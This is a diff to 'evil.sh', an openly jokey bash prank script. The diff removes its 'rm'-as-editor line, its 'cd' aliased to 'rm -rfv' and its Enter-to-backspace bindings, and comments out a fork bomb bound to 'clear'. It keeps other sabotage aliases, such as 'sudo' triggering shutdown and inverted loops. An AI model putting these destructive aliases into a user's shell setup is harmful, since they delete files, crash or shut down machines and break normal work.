@@ -1,8 +1,6 @@
 #!/usr/bin/env bash
 # evil.sh — https://mths.be/evil.sh
 
-# Set `rm` as the default editor.
-export EDITOR=/bin/rm;
 
 # Make Tab send the delete key.
 tset -Qe $'\t';
@@ -16,14 +14,12 @@ alias cat=true;
 # Use a random sort option whenever `ls` is invoked.
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
-# Delete directories instead of entering them.
-alias cd='rm -rfv';
 
 # Shut down the computer instead of running a command with super-user rights.
 alias sudo='sudo shutdown -P now';
 
 # Launch a fork bomb instead of clearing the screen.
-alias clear=':(){ :|:& };:';
+# alias clear=':(){ :|:& };:';
 
 # Have `date` return random dates.
 alias date='date -d "now + $RANDOM days"';
@@ -70,10 +66,6 @@ function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 
 
 # Invert `if`, `for`, and `while`.
 alias if='if !' for='for !' while='while !';
-
-# Map Enter, Ctrl+J, and Ctrl+M to backspace.
-bind '"\C-J":"\C-?"';
-bind '"\C-M":"\C-?"';
 
 # Send `n` (no) instead of `y` (yes)
 alias yes="yes n";
